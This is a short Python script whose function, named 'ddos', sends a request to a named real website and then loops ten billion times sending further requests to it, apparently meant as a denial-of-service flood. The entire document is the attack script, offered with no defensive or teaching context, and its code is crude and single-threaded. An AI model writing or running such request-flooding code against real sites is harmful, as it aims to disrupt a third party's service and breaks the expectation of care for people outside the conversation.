import requests

def ddos():
    resp = requests.get("https://pornhub.com")
    print(resp.status_code)
    for i in range(10000000000):
        requests.get("https://pornhub.com")
    else:
        print("Now wait a second.........")
        exit(0)
    